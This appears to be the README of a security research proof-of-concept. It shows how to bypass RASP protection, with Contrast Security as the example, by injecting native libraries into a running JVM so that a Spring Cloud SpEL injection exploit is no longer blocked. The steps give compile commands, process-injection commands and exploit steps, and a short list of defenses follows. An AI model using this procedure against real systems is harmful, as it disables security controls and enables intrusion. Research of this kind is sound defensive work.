RASP Bypass using Process Injection

Inject it in the target process
- set JAVA_HOME property (e.g. export JAVA_HOME=/Library/Java/JavaVirtualMachines/openjdk-17.jdk/Contents/Home)
- Compile libraries
    - g++ -shared -arch arm64 -I"$JAVA_HOME/include" -I"$JAVA_HOME/include/darwin" redefineTransformerManager.cpp -o redefineTransformerManager.dylib -L"$JAVA_HOME/lib/server" -ljvm
    - g++ -shared -arch arm64 -I"$JAVA_HOME/include" -I"$JAVA_HOME/include/darwin" redefineProcessBuilder.cpp -o redefineProcessBuilder.dylib -L"$JAVA_HOME/lib/server" -ljvm
    - g++ -shared -arch arm64 -I"$JAVA_HOME/include" -I"$JAVA_HOME/include/darwin" redefineSpelExpressionParser.cpp -o redefineSpelExpressionParser.dylib -L"$JAVA_HOME/lib/server" -ljvm
- run spring application in springcloud-spel-injection with rasp agent loaded  (eg. contrast security: -javaagent:../contrast-agent-6.0.0.jar -Dcontrast.config.path=../contrast.yaml)
- run ./springcloud-spel-injection/exploit.sh it should be blocked
- now inject the library (e.g. using ptrace for macos/linux: https://github.com/kubo/injector)
- cd injector/cmd
- ./injector -java -p $pid path/to/redefineTransformerManager.dylib
- ./injector -java -p $pid path/to/redefineSpelExpressionParser.dylib
- ./injector -java -p $pid path/to/redefineProcessBuilder.dylib
- Look at the spring app logs, and confirm that the injection succeeded
- now rerun the exploit, you should have bypassed rasp

**Defenses**

- In order for RASP to protect against Process injection, they should work at lower level...
- RASP solutions should at least inspect critical classes modified at runtime ?